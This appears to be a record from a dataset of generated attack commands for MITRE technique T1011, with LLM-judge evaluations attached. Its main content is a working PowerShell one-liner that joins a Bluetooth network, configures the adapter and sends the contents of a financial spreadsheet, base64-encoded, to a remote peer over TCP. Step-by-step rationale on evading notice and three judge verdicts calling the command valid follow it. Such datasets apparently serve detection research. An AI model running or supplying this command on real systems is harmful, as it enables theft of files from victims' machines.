command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\Users\Public\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()
explanation: Pairs/connects to a Bluetooth NAP, configures the Bluetooth PAN interface, and exfiltrates a file as base64 over a custom TCP port bound to the Bluetooth IP, aligning with T1011 (alternate network medium).
rationale_steps: Establish Bluetooth PAN via BluetoothCL to use a non-primary medium (Bluetooth).
Assign a static IP on the Bluetooth adapter with netsh to isolate traffic.
Base64-encode data to blend content while keeping commands unobfuscated.
Bind TCP client to the Bluetooth IP to force egress over Bluetooth and send to a high, uncommon port.

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quotes/braces, valid separators, and correct invocation of external commands and .NET methods.
llm_judgments.semantic_justification: It attempts Bluetooth NAP connection, configures a PAN IP, binds a TCP client to that interface, and sends base64 file data to a peer, though IP configuration typically needs admin rights and BluetoothCL’s NAP connect support may vary.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, correct .NET object instantiation syntax, and valid piping constructs throughout.
llm_judgments.semantic_justification: The command precisely implements T1011 by connecting to a Bluetooth NAP device via MAC address, dynamically identifying and configuring the Bluetooth PAN network interface with a static IP, reading a target file, base64-encoding it, and exfiltrating it over a TCP connection bound specifically to the Bluetooth interface IP — fully leveraging an alternate network medium for exfiltration.

llm_judgments.syntactic_justification: The command is perfectly formed PowerShell with correct use of semicolons, .NET classes, and variable interpolation.
llm_judgments.semantic_justification: The command effectively demonstrates exfiltration over Bluetooth as described, though the use of netsh to set a static IP address requires administrative privileges, which contradicts the 'None' privilege level provided in the metadata.
